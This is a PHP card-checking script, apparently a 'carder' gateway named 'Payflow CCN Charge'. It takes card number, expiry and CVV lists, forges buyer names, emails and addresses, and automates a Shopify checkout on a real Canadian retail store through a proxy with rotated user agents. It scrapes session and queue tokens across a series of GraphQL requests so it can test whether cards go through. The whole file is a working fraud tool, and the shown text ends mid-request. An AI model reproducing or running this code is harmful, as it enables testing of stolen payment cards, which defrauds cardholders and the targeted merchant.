<?php
foreach (glob('Require/*.php') as $key) {
  require_once($key);
}
error_reporting(1);
set_time_limit(0);
list($cc, $mes, $ano, $cvv) = explode('|', $lista = GetCC());

$Gateway = 'Payflow CCN Charge';
$PROXY = [
  "METHOD" => "CUSTOM",
  "SERVER" => '127.0.0.1:8080',
  #"AUTH" => 'brd-customer-hl_49330171-zone-datacenter_proxy2:5pbh5b8o12ke'
];
if ($lista != '') {
  $tries = -1;
  retry:
  $tries++;

  CurlX::DeleteCookie();
  if ($tries == '8')
    GetResponse('DEAD', 'MAX RETRY');

  try {
    $COOKIE = uniqid();
    $ua = CurlX::GetRandVal('SafariUA.txt');
    extract(Random_Dates());
    list($address, $city, $state, $stateAB, $zip) = explode(',', CurlX::GetRandVal('AddressUSA.txt'));
    $zip1 = substr_count($zip, '-') ? explode('-', $zip)[0] : $zip;
    #$zip = substr_count($zip, '-') ? explode('-', $zip)[0] : $zip;
    $streets = explode(' ', $address);
    $streetnumber = $streets[0];
    $streetname1 = $streets[1];
    $streetname2 = $streets[2];
    $streetname = $streetname1 . ' ' . $streetname2;

    $bin = substr($cc, 0, 6);
    $c1 = substr($cc, 0, 4);
    $c2 = substr($cc, 4, 4);
    $c3 = substr($cc, 8, 4);
    $c4 = substr($cc, -4);
    $ct = substr($cc, -2);
    $mas = rand(11, 99);
    $smail = $name . $last . '@gmail.com';
    $n1 = substr($phone, 0, 3);
    $n2 = substr($phone, 3, 3);
    $n3 = substr($phone, -4);


    switch ($cc[0]) {
      case '3':
        $TYPE_CC = '003';
        break;
      case '4':
        $TYPE_CC = 'VI';
        break;
      case '5':
        $TYPE_CC = 'MC';
        break;
      case '6':
        $TYPE_CC = '004';
        break;
    }


    #------------------------[GET]------------------------#
    $URL = 'https://tacticalproductscanada.com/collections/umarex/products/umarex-t4e-50cal-qab50-glass-breaking-polymer-balls';

$HEADERS = [
'Host: tacticalproductscanada.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language: en-US,en;q=0.9',
];
$curl = CurlX::Get($URL, $HEADERS, $COOKIE, $PROXY)->body;
$ACCESS_TOKEN = CurlX::ParseString($curl, '"accessToken":"','"');
$VARIANT = CurlX::ParseString($curl, '"variantId":',',"');
$AMOUNT = CurlX::ParseString($curl, '<meta property="og:price:amount" content="','">');
Logger::pretier("Access Token: {$ACCESS_TOKEN}", 'ATOK');
Logger::pretier("VARIANT: {$VARIANT}\namt: $AMOUNT", 'ATOK');

    #------------------------[Curl-1]------------------------#

$URL = 'https://tacticalproductscanada.com/api/unstable/graphql.json?operation_name=cartCreate';

$HEADERS = [
'Host: tacticalproductscanada.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
'Accept: application/json',
'Accept-Language: en-US,en;q=0.9',
'Referer: https://tacticalproductscanada.com/collections/umarex/products/umarex-t4e-50cal-qab50-glass-breaking-polymer-balls',
'Content-Type: application/json',
'X-Shopify-Storefront-Access-Token: '.$ACCESS_TOKEN.'',
'X-SDK-Variant: portable-wallets',
'X-Wallet-Name: BuyItNow',
'X-Start-Wallet-Checkout: true',
'Origin: https://tacticalproductscanada.com',
];

$DATA = '{"query":"mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode)@inContext(country:$country language:$language){result:cartCreate(input:$input){cart{...CartParts}errors:userErrors{...on CartUserError{message field code}}warnings:warnings{...on CartWarning{code}}}}fragment CartParts on Cart{id checkoutUrl deliveryGroups(first:10){edges{node{id groupType selectedDeliveryOption{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}deliveryOptions{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}}}}cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}totalTaxAmount{amount currencyCode}totalDutyAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}discountCodes{code applicable}lines(first:10){edges{node{...on CartLine{parentRelationship{parent{id}}}quantity cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}merchandise{...on ProductVariant{requiresShipping title product{title}}}sellingPlanAllocation{remainingBalanceChargeAmount{amount}priceAdjustments{price{amount currencyCode}}sellingPlan{billingPolicy{...on SellingPlanRecurringBillingPolicy{interval intervalCount}}priceAdjustments{orderCount}recurringDeliveries}}}}}}","variables":{"input":{"lines":[{"merchandiseId":"gid://shopify/ProductVariant/'.$VARIANT.'","quantity":1,"attributes":[]}],"discountCodes":[]},"country":"CA","language":"EN"}}';
$curl = CurlX::Post($URL, $DATA, $HEADERS, $COOKIE, $PROXY)->body;
$CART_LINK = CurlX::ParseString($curl, '"cart":{"id":"gid://shopify/Cart/','"');
$KEYY = CurlX::ParseString($curl, 'shopify/Cart/','?key');
$KEYY2 = CurlX::ParseString($curl, '"cart":{"id":"gid://shopify/Cart/'.$KEYY.'?key=','"');
// 
//  #hWNAYfaQSODD9x2AyVHKeYFw?key=412f72c73a1271fa51d2a195ded7ecee
Logger::pretier("Cart link: {$CART_LINK}\nKEY: {$KEYY}\nKEY: {$KEYY2}", 'CArt Dates');
    #------------------------[Curl-2]------------------------#

$URL = 'https://tacticalproductscanada.com/cart/c/'.$CART_LINK.'';

$HEADERS = [
'Host: tacticalproductscanada.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language: en-US,en;q=0.9',
'Referer: https://tacticalproductscanada.com/collections/umarex/products/umarex-t4e-50cal-qab50-glass-breaking-polymer-balls',
];
$curl = CurlX::Get($URL, $HEADERS, $COOKIE, $PROXY)->body;
$SESSION = CurlX::ParseString($curl, '<meta name="serialized-sessionToken" content="','" />');
$SESSION = htmlspecialchars_decode($SESSION);
$SESSION = CurlX::ParseString($SESSION, '"','"');
$BUILD_ID = CurlX::ParseString($curl, 'meta name="serialized-environment" content="{&quot;commitSha&quot;:&quot;','&');
$BUILD_ID = htmlspecialchars_decode($BUILD_ID);

$NEW_URL = CurlX::ParseString($curl,'<meta name="serialized-initial-url" content="&quot;https://tacticalproductscanada.com/checkouts/cn/','&quot;"/>');#<meta name="serialized-initial-url" content="&quot;https://tacticalproductscanada.com/checkouts/cn/hWNAYfaQSODD9x2AyVHKeYFw/en-ca?_r=AQABi61lhazkLMhz4Pv6SjGgEh2d8Q6EMHaEaMUm4kCZKYE&quot;"/>

$QUEUE_TOKEN = CurlX::ParseString($curl, '&quot;queueToken&quot;:&quot;','&quot');

$STAPLE_ID = CurlX::ParseString($curl, '[{&quot;stableId&quot;:&quot;','&quot;,&quot;merchandise&quot;:{');


$PAYMENT_IDENTIFIER = CurlX::ParseString($curl, '&quot;paymentMethodIdentifier&quot;:&quot;','&quot;');

$NEW_JSON = CurlX::ParseString($curl, '"/cdn/shopifycloud/checkout-web/assets/c1/actions.','.js"');
$phone = "732$n2$n3";
$email = "$last$name$c4@gmail.com";


Logger::pretier("QUEUE_TOKEN: {$QUEUE_TOKEN}\nSESSION: {$SESSION}\nBUILD_ID: {$BUILD_ID}\nSTAPLE_ID: {$STAPLE_ID}\nPAYMENT IDEN: {$PAYMENT_IDENTIFIER}\nNEW_JSON: {$NEW_JSON}\nPhone: $phone $email", 'CArt Dates');

    #------------------------[Curl-3]------------------------#

$URL = 'https://tacticalproductscanada.com/cdn/shopifycloud/checkout-web/assets/c1/actions.'.$NEW_JSON.'.js';

$HEADERS = [
'Host: tacticalproductscanada.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
'Accept: */*',
'Accept-Language: en-US,en;q=0.9',
'Referer: https://tacticalproductscanada.com/checkouts/cn/'.$NEW_URL.'',
];
$curl = CurlX::Get($URL, $HEADERS, $COOKIE, $PROXY)->body;

preg_match_all('/const Gn={id:"(.*?)",type:"query",name:"Proposal"/', $curl, $nnn);
$ID = $nnn['1']['0'];
preg_match_all('/const Mn={id:"(.*?)",type:"mutation",name:"SubmitForCompletion"/',$curl, $nns);
$IDs = $nns['1']['0'];

Logger::pretier("ID: {$ID}\nID: {$IDs}", 'CArt Dates');

    #------------------------[Curl-4]------------------------#

$URL = 'https://tacticalproductscanada.com/checkouts/internal/preloads.js?locale=en-CA';

$HEADERS = [
'Host: tacticalproductscanada.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
'Accept: */*',
'Accept-Language: en-US,en;q=0.9',
'Referer: https://tacticalproductscanada.com/collections/umarex/products/umarex-t4e-50cal-qab50-glass-breaking-polymer-balls',
];
$curl = CurlX::Get($URL, $HEADERS, $COOKIE, $PROXY)->body;
$NEW_SHIT = CurlX::ParseString($curl, '"/cdn/shopifycloud/checkout-web/assets/c1/hooks-useHasOrdersFromMultipleShops.','.js"');


Logger::pretier("NEW_SHIT: {$NEW_SHIT}", 'CArt Dates');

    #------------------------[Curl-5]------------------------#

#"/cdn/shopifycloud/checkout-web/assets/c1/hooks-useHasOrdersFromMultipleShops.DJ4jeE9t.js"
$URL = 'https://tacticalproductscanada.com/cdn/shopifycloud/checkout-web/assets/c1/hooks-useHasOrdersFromMultipleShops.'.$NEW_SHIT.'.js';

$HEADERS = [
'Host: tacticalproductscanada.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
'Accept: */*',
'Accept-Language: en-US,en;q=0.9',
'Referer: https://tacticalproductscanada.com/checkouts/cn/'.$KEYY.'/en-ca?_r='.$KEYY2.'',
'Sec-GPC: 1',
];
$curl = CurlX::Get($URL, $HEADERS, $COOKIE, $PROXY)->body;

#preg_match_all('/L8={id:"(.*?)",type:"query",name:"PollForReceipt"/',$curl, $nnc);
$IDq = CurlX::ParseString($curl, 'N8={id:"','",type:"query",name:"PollForReceipt"');
Logger::pretier("IDq: {$IDq}", 'CArt Dates');


    #------------------------[Curl-6]------------------------#

$URL = 'https://tacticalproductscanada.com/checkouts/internal/graphql/persisted?operationName=Proposal';

$HEADERS = [
'Host: tacticalproductscanada.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
'Accept: application/json',
'Accept-Language: en-CA',
'Referer: https://tacticalproductscanada.com/checkouts/cn/'.$NEW_URL.'',
'content-type: application/json',
'shopify-checkout-client: checkout-web/1.0',
'shopify-checkout-source: id="'.$KEYY.'", type="cn"',
'x-checkout-one-session-token: '.$SESSION.'',
'x-checkout-web-build-id: '.$BUILD_ID.'',
'x-checkout-web-deploy-stage: production',
'x-checkout-web-server-handling: fast',
'x-checkout-web-server-rendering: yes',
'x-checkout-web-source-id: '.$KEYY.'',
'Origin: https://tacticalproductscanada.com',
];

$DATA = '{"variables":{"sessionInput":{"sessionToken":"'.$SESSION.'"},"queueToken":"'.$QUEUE_TOKEN.'","discounts":{"lines":[],"acceptUnexpectedDiscounts":true},"delivery":{"deliveryLines":[{"destination":{"partialStreetAddress":{"address1":"","city":"","countryCode":"CA","lastName":"","phone":"","oneTimeUse":false}},"selectedDeliveryStrategy":{"deliveryStrategyMatchingConditions":{"estimatedTimeInTransit":{"any":true},"shipments":{"any":true}},"options":{}},"targetMerchandiseLines":{"any":true},"deliveryMethodTypes":["SHIPPING"],"expectedTotalPrice":{"any":true},"destinationChanged":true}],"noDeliveryRequired":[],"useProgressiveRates":false,"prefetchShippingRatesStrategy":null,"supportsSplitShipping":true},"deliveryExpectations":{"deliveryExpectationLines":[]},"merchandise":{"merchandiseLines":[{"stableId":"'.$STAPLE_ID.'","merchandise":{"productVariantReference":{"id":"gid://shopify/ProductVariantMerchandise/'.$VARIANT.'","variantId":"gid://shopify/ProductVariant/'.$VARIANT.'","properties":[],"sellingPlanId":null,"sellingPlanDigest":null}},"quantity":{"items":{"value":1}},"expectedTotalPrice":{"value":{"amount":"'.$AMOUNT.'","currencyCode":"CAD"}},"lineComponentsSource":null,"lineComponents":[]}]},"memberships":{"memberships":[]},"payment":{"totalAmount":{"any":true},"paymentLines":[{"paymentMethod":{"directPaymentMethod":null,"giftCardPaymentMethod":null,"redeemablePaymentMethod":null,"walletPaymentMethod":null,"walletsPlatformPaymentMethod":null,"localPaymentMethod":null,"paymentOnDeliveryMethod":null,"paymentOnDeliveryMethod2":null,"manualPaymentMethod":null,"customPaymentMethod":null,"offsitePaymentMethod":{"name":"Payment Method","paymentMethodIdentifier":"'.$PAYMENT_IDENTIFIER.'","billingAddress":{"streetAddress":{"address1":"","city":"","countryCode":"CA","lastName":"","phone":""}}},"customOnsitePaymentMethod":null,"deferredPaymentMethod":null,"customerCreditCardPaymentMethod":null,"paypalBillingAgreementPaymentMethod":null,"remotePaymentInstrument":null},"amount":{"any":true}}],"billingAddress":{"streetAddress":{"address1":"","city":"","countryCode":"CA","lastName":"","phone":""}}},"buyerIdentity":{"customer":{"presentmentCurrency":"CAD","countryCode":"CA"},"phoneCountryCode":"CA","marketingConsent":[],"shopPayOptInPhone":{"countryCode":"CA"},"rememberMe":false},"tip":{"tipLines":[]},"poNumber":null,"taxes":{"proposedAllocations":null,"proposedTotalAmount":{"value":{"amount":"1.1","currencyCode":"CAD"}},"proposedTotalIncludedAmount":null,"proposedMixedStateTotalAmount":null,"proposedExemptions":[]},"note":{"message":null,"customAttributes":[]},"localizationExtension":{"fields":[]},"nonNegotiableTerms":null,"scriptFingerprint":{"signature":null,"signatureUuid":null,"lineItemScriptChanges":[],"paymentScriptChanges":[],"shippingScriptChanges":[]},"optionalDuties":{"buyerRefusesDuties":false},"cartMetafields":[],"includeTaxStrategyLines":false},"operationName":"Proposal","id":"'.$ID.'"}';
$curl = CurlX::Post($URL, $DATA, $HEADERS, $COOKIE, $PROXY)->body;
$QUEUE_TOKEN = CurlX::ParseString($curl, '"queueToken":"','"'); #A0AiQmqC389_WbHNGLlezCDxTn9-0GBcKcHZcNFIwkomNT1FYya5beLIB7L1tJFmDjeDXdV3yGhSe-TsE02hlH1qyEmgieNZiwsd3wAEZRu3Vln0QjtHGXaYiO9Epg==
$AMT2 = CurlX::ParseString($curl, 'totalTaxAndDutyAmount":{"value":{"amount":"','","currencyCode');
Logger::pretier("QUEUE_TOKEN: {$QUEUE_TOKEN}", 'CArt Dates');

    #------------------------[Curl-7]------------------------#

$URL = 'https://tacticalproductscanada.com/checkouts/internal/graphql/persisted?operationName=Proposal';

$HEADERS = [
'Host: tacticalproductscanada.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
'Accept: application/json',
'Accept-Language: en-CA',
'Referer: https://tacticalproductscanada.com/checkouts/cn/'.$NEW_URL.'',
'content-type: application/json',
'shopify-checkout-client: checkout-web/1.0',
'shopify-checkout-source: id="'.$KEYY.'", type="cn"',
'x-checkout-one-session-token: '.$SESSION.'',
'x-checkout-web-build-id: '.$BUILD_ID.'',
'x-checkout-web-deploy-stage: production',
'x-checkout-web-server-handling: fast',
'x-checkout-web-server-rendering: yes',
'x-checkout-web-source-id: '.$KEYY.'',
'Origin: https://tacticalproductscanada.com',
];

$DATA = '{"variables":{"sessionInput":{"sessionToken":"'.$SESSION.'"},"queueToken":"'.$QUEUE_TOKEN.'","discounts":{"lines":[],"acceptUnexpectedDiscounts":true},"delivery":{"deliveryLines":[{"destination":{"partialStreetAddress":{"address1":"","city":"","countryCode":"CA","lastName":"","phone":"","oneTimeUse":false}},"selectedDeliveryStrategy":{"deliveryStrategyMatchingConditions":{"estimatedTimeInTransit":{"any":true},"shipments":{"any":true}},"options":{}},"targetMerchandiseLines":{"any":true},"deliveryMethodTypes":["SHIPPING"],"expectedTotalPrice":{"any":true},"destinationChanged":true}],"noDeliveryRequired":[],"useProgressiveRates":false,"prefetchShippingRatesStrategy":null,"supportsSplitShipping":true},"deliveryExpectations":{"deliveryExpectationLines":[]},"merchandise":{"merchandiseLines":[{"stableId":"'.$STAPLE_ID.'","merchandise":{"productVariantReference":{"id":"gid://shopify/ProductVariantMerchandise/'.$VARIANT.'","variantId":"gid://shopify/ProductVariant/'.$VARIANT.'","properties":[],"sellingPlanId":null,"sellingPlanDigest":null}},"quantity":{"items":{"value":1}},"expectedTotalPrice":{"value":{"amount":"'.$AMOUNT.'","currencyCode":"CAD"}},"lineComponentsSource":null,"lineComponents":[]}]},"memberships":{"memberships":[]},"payment":{"totalAmount":{"any":true},"paymentLines":[{"paymentMethod":{"directPaymentMethod":null,"giftCardPaymentMethod":null,"redeemablePaymentMethod":null,"walletPaymentMethod":null,"walletsPlatformPaymentMethod":null,"localPaymentMethod":null,"paymentOnDeliveryMethod":null,"paymentOnDeliveryMethod2":null,"manualPaymentMethod":null,"customPaymentMethod":null,"offsitePaymentMethod":{"name":"Payment Method","paymentMethodIdentifier":"'.$PAYMENT_IDENTIFIER.'","billingAddress":{"streetAddress":{"address1":"","city":"","countryCode":"CA","lastName":"","phone":""}}},"customOnsitePaymentMethod":null,"deferredPaymentMethod":null,"customerCreditCardPaymentMethod":null,"paypalBillingAgreementPaymentMethod":null,"remotePaymentInstrument":null},"amount":{"any":true}}],"billingAddress":{"streetAddress":{"address1":"","city":"","countryCode":"CA","lastName":"","phone":""}}},"buyerIdentity":{"customer":{"presentmentCurrency":"CAD","countryCode":"CA"},"email":"'.$email.'","emailChanged":true,"phoneCountryCode":"CA","marketingConsent":[{"email":{"value":"'.$email.'"}}],"shopPayOptInPhone":{"countryCode":"CA"},"rememberMe":false},"tip":{"tipLines":[]},"taxes":{"proposedAllocations":null,"proposedTotalAmount":{"value":{"amount":"'.$AMT2.'","currencyCode":"CAD"}},"proposedTotalIncludedAmount":null,"proposedMixedStateTotalAmount":null,"proposedExemptions":[]},"note":{"message":null,"customAttributes":[]},"localizationExtension":{"fields":[]},"nonNegotiableTerms":null,"scriptFingerprint":{"signature":null,"signatureUuid":null,"lineItemScriptChanges":[],"paymentScriptChanges":[],"shippingScriptChanges":[]},"optionalDuties":{"buyerRefusesDuties":false},"cartMetafields":[],"includeTaxStrategyLines":false},"operationName":"Proposal","id":"'.$ID.'"}';
$curl = CurlX::Post($URL, $DATA, $HEADERS, $COOKIE, $PROXY)->body;
$QUEUE_TOKEN = CurlX::ParseString($curl, '"queueToken":"','"'); #A0AiQmqC389_WbHNGLlezCDxTn9-0GBcKcHZcNFIwkomNT1FYya5beLIB7L1tJFmDjeDXdV3yGhSe-TsE02hlH1qyEmgieNZiwsd3wAEZRu3Vln0QjtHGXaYiO9Epg==

Logger::pretier("QUEUE_TOKEN: {$QUEUE_TOKEN}", 'CArt Dates');

    #------------------------[Curl-8]------------------------#

$URL = 'https://tacticalproductscanada.com/checkouts/internal/graphql/persisted?operationName=Proposal';

$HEADERS = [
'Host: tacticalproductscanada.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
'Accept: application/json',
'Accept-Language: en-CA',
'Referer: https://tacticalproductscanada.com/checkouts/cn/'.$NEW_URL.'',
'content-type: application/json',
'shopify-checkout-client: checkout-web/1.0',
'shopify-checkout-source: id="'.$KEYY.'", type="cn"',
'x-checkout-one-session-token: '.$SESSION.'',
'x-checkout-web-build-id: '.$BUILD_ID.'',
'x-checkout-web-deploy-stage: production',
'x-checkout-web-server-handling: fast',
'x-checkout-web-server-rendering: yes',
'x-checkout-web-source-id: '.$KEYY.'',
'Origin: https://tacticalproductscanada.com',
];

$DATA = '{"variables":{"sessionInput":{"sessionToken":"'.$SESSION.'"},"queueToken":"'.$QUEUE_TOKEN.'","discounts":{"lines":[],"acceptUnexpectedDiscounts":true},"delivery":{"deliveryLines":[{"destination":{"partialStreetAddress":{"address1":"'.$c4.' Reserve St","city":"Elgin","countryCode":"CA","postalCode":"K0G 1E0","firstName":"'.$name.'","lastName":"'.$last.'","zoneCode":"ON","phone":"","oneTimeUse":false}},"selectedDeliveryStrategy":{"deliveryStrategyMatchingConditions":{"estimatedTimeInTransit":{"any":true},"shipments":{"any":true}},"options":{}},"targetMerchandiseLines":{"any":true},"deliveryMethodTypes":["SHIPPING"],"expectedTotalPrice":{"any":true},"destinationChanged":true}],"noDeliveryRequired":[],"useProgressiveRates":false,"prefetchShippingRatesStrategy":null,"supportsSplitShipping":true},"deliveryExpectations":{"deliveryExpectationLines":[]},"merchandise":{"merchandiseLines":[{"stableId":"'.$STAPLE_ID.'","merchandise":{"productVariantReference":{"id":"gid://shopify/ProductVariantMerchandise/'.$VARIANT.'","variantId":"gid://shopify/ProductVariant/'.$VARIANT.'","properties":[],"sellingPlanId":null,"sellingPlanDigest":null}},"quantity":{"items":{"value":1}},"expectedTotalPrice":{"value":{"amount":"'.$AMOUNT.'","currencyCode":"CAD"}},"lineComponentsSource":null,"lineComponents":[]}]},"memberships":{"memberships":[]},"payment":{"totalAmount":{"any":true},"paymentLines":[{"paymentMethod":{"directPaymentMethod":null,"giftCardPaymentMethod":null,"redeemablePaymentMethod":null,"walletPaymentMethod":null,"walletsPlatformPaymentMethod":null,"localPaymentMethod":null,"paymentOnDeliveryMethod":null,"paymentOnDeliveryMethod2":null,"manualPaymentMethod":null,"customPaymentMethod":null,"offsitePaymentMethod":{"name":"Payment Method","paymentMethodIdentifier":"'.$PAYMENT_IDENTIFIER.'","billingAddress":{"streetAddress":{"address1":"'.$c4.' Reserve St","city":"Elgin","countryCode":"CA","postalCode":"K0G 1E0","firstName":"'.$name.'","lastName":"'.$last.'","zoneCode":"ON","phone":""}}},"customOnsitePaymentMethod":null,"deferredPaymentMethod":null,"customerCreditCardPaymentMethod":null,"paypalBillingAgreementPaymentMethod":null,"remotePaymentInstrument":null},"amount":{"any":true}}],"billingAddress":{"streetAddress":{"address1":"'.$c4.' Reserve St","city":"Elgin","countryCode":"CA","postalCode":"K0G 1E0","firstName":"'.$name.'","lastName":"'.$last.'","zoneCode":"ON","phone":""}}},"buyerIdentity":{"customer":{"presentmentCurrency":"CAD","countryCode":"CA"},"email":"'.$email.'","emailChanged":false,"phoneCountryCode":"CA","marketingConsent":[{"email":{"value":"'.$email.'"}}],"shopPayOptInPhone":{"countryCode":"CA"},"rememberMe":false},"tip":{"tipLines":[]},"taxes":{"proposedAllocations":null,"proposedTotalAmount":{"value":{"amount":"'.$AMT2.'","currencyCode":"CAD"}},"proposedTotalIncludedAmount":null,"proposedMixedStateTotalAmount":null,"proposedExemptions":[]},"note":{"message":null,"customAttributes":[]},"localizationExtension":{"fields":[]},"nonNegotiableTerms":null,"scriptFingerprint":{"signature":null,"signatureUuid":null,"lineItemScriptChanges":[],"paymentScriptChanges":[],"shippingScriptChanges":[]},"optionalDuties":{"buyerRefusesDuties":false},"cartMetafields":[],"includeTaxStrategyLines":false},"operationName":"Proposal","id":"'.$ID.'"}';
$curl = CurlX::Post($URL, $DATA, $HEADERS, $COOKIE, $PROXY)->body;
$QUEUE_TOKEN = CurlX::ParseString($curl, '"queueToken":"','"'); #A0AiQmqC389_WbHNGLlezCDxTn9-0GBcKcHZcNFIwkomNT1FYya5beLIB7L1tJFmDjeDXdV3yGhSe-TsE02hlH1qyEmgieNZiwsd3wAEZRu3Vln0QjtHGXaYiO9Epg==

$HANDLE = CurlX::ParseString($curl, '"handle":"','"');
Logger::pretier("QUEUE_TOKEN: {$QUEUE_TOKEN}\nHandle: {$HANDLE}", 'CArt Dates');

    #------------------------[Curl-9]------------------------#

    $URL = 'https://tacticalproductscanada.com/checkouts/internal/graphql/persisted?operationName=Proposal';

$HEADERS = [
'Host: tacticalproductscanada.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
'Accept: application/json',
'Accept-Language: en-CA',
'Referer: https://tacticalproductscanada.com/checkouts/cn/'.$NEW_URL.'',
'content-type: application/json',
'shopify-checkout-client: checkout-web/1.0',
'shopify-checkout-source: id="'.$KEYY.'", type="cn"',
'x-checkout-one-session-token: '.$SESSION.'',
'x-checkout-web-build-id: '.$BUILD_ID.'',
'x-checkout-web-deploy-stage: production',
'x-checkout-web-source-id: '.$KEYY.'',
'Origin: https://tacticalproductscanada.com',
];

$DATA = '{"variables":{"sessionInput":{"sessionToken":"'.$SESSION.'"},"queueToken":"'.$QUEUE_TOKEN.'","discounts":{"lines":[],"acceptUnexpectedDiscounts":true},"delivery":{"deliveryLines":[{"destination":{"partialStreetAddress":{"address1":"'.$c4.' Reserve St","city":"Elgin","countryCode":"CA","postalCode":"K0G 1E0","firstName":"'.$name.'","lastName":"'.$last.'","zoneCode":"ON","phone":"","oneTimeUse":false}},"selectedDeliveryStrategy":{"deliveryStrategyMatchingConditions":{"estimatedTimeInTransit":{"any":true},"shipments":{"any":true}},"options":{}},"targetMerchandiseLines":{"any":true},"deliveryMethodTypes":["SHIPPING"],"expectedTotalPrice":{"any":true},"destinationChanged":true}],"noDeliveryRequired":[],"useProgressiveRates":false,"prefetchShippingRatesStrategy":null,"supportsSplitShipping":true},"deliveryExpectations":{"deliveryExpectationLines":[]},"merchandise":{"merchandiseLines":[{"stableId":"'.$STAPLE_ID.'","merchandise":{"productVariantReference":{"id":"gid://shopify/ProductVariantMerchandise/'.$VARIANT.'","variantId":"gid://shopify/ProductVariant/'.$VARIANT.'","properties":[],"sellingPlanId":null,"sellingPlanDigest":null}},"quantity":{"items":{"value":1}},"expectedTotalPrice":{"value":{"amount":"'.$AMOUNT.'","currencyCode":"CAD"}},"lineComponentsSource":null,"lineComponents":[]}]},"memberships":{"memberships":[]},"payment":{"totalAmount":{"any":true},"paymentLines":[{"paymentMethod":{"directPaymentMethod":null,"giftCardPaymentMethod":null,"redeemablePaymentMethod":null,"walletPaymentMethod":null,"walletsPlatformPaymentMethod":null,"localPaymentMethod":null,"paymentOnDeliveryMethod":null,"paymentOnDeliveryMethod2":null,"manualPaymentMethod":null,"customPaymentMethod":null,"offsitePaymentMethod":{"name":"Payment Method","paymentMethodIdentifier":"'.$PAYMENT_IDENTIFIER.'","billingAddress":{"streetAddress":{"address1":"'.$c4.' Reserve St","city":"Elgin","countryCode":"CA","postalCode":"K0G 1E0","firstName":"'.$name.'","lastName":"'.$last.'","zoneCode":"ON","phone":""}}},"customOnsitePaymentMethod":null,"deferredPaymentMethod":null,"customerCreditCardPaymentMethod":null,"paypalBillingAgreementPaymentMethod":null,"remotePaymentInstrument":null},"amount":{"any":true}}],"billingAddress":{"streetAddress":{"address1":"'.$c4.' Reserve St","city":"Elgin","countryCode":"CA","postalCode":"K0G 1E0","firstName":"'.$name.'","lastName":"'.$last.'","zoneCode":"ON","phone":""}}},"buyerIdentity":{"customer":{"presentmentCurrency":"CAD","countryCode":"CA"},"email":"'.$email.'","emailChanged":false,"phoneCountryCode":"CA","marketingConsent":[{"email":{"value":"'.$email.'"}}],"shopPayOptInPhone":{"countryCode":"CA"},"rememberMe":false},"tip":{"tipLines":[]},"taxes":{"proposedAllocations":null,"proposedTotalAmount":{"value":{"amount":"'.$AMT2.'","currencyCode":"CAD"}},"proposedTotalIncludedAmount":null,"proposedMixedStateTotalAmount":null,"proposedExemptions":[]},"note":{"message":null,"customAttributes":[]},"localizationExtension":{"fields":[]},"nonNegotiableTerms":null,"scriptFingerprint":{"signature":null,"signatureUuid":null,"lineItemScriptChanges":[],"paymentScriptChanges":[],"shippingScriptChanges":[]},"optionalDuties":{"buyerRefusesDuties":false},"cartMetafields":[],"includeTaxStrategyLines":false},"operationName":"Proposal","id":"'.$ID.'"}';
$curl = CurlX::Post($URL, $DATA, $HEADERS, $COOKIE, $PROXY)->body;

$AMT3 = CurlX::ParseString($curl, '"totalTaxAndDutyAmount":{"value":{"amount":"','"');
$QUEUE_TOKEN = CurlX::ParseString($curl, '"queueToken":"','"'); #A0AiQmqC389_WbHNGLlezCDxTn9-0GBcKcHZcNFIwkomNT1FYya5beLIB7L1tJFmDjeDXdV3yGhSe-TsE02hlH1qyEmgieNZiwsd3wAEZRu3Vln0QjtHGXaYiO9Epg==
$SIGNED_HANDLE = CurlX::ParseString($curl, '"signedHandle":"','"');
Logger::pretier("QUEUE_TOKEN: {$QUEUE_TOKEN}\nSIGNED_HANDLE: {$SIGNED_HANDLE}\nAmt: $AMT3", 'CArt Dates');


$URL = 'https://tacticalproductscanada.com/checkouts/internal/graphql/persisted?operationName=Proposal';
$HEADERS = [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
    'Accept: application/json',
    'Accept-Language: en-CA',
'Referer: https://tacticalproductscanada.com/checkouts/cn/'.$NEW_URL.'',
    'content-type: application/json',
    'shopify-checkout-client: checkout-web/1.0',
'shopify-checkout-source: id="'.$KEYY.'", type="cn"',
    'x-checkout-one-session-token: '.$SESSION.'',
    'x-checkout-web-build-id: '.$BUILD_ID.'',
    'x-checkout-web-deploy-stage: production',
    'x-checkout-web-server-handling: fast',
    'x-checkout-web-server-rendering: yes',
    'x-checkout-web-source-id: '.$KEYY.'',
    'Origin: https://tacticalproductscanada.com',
];

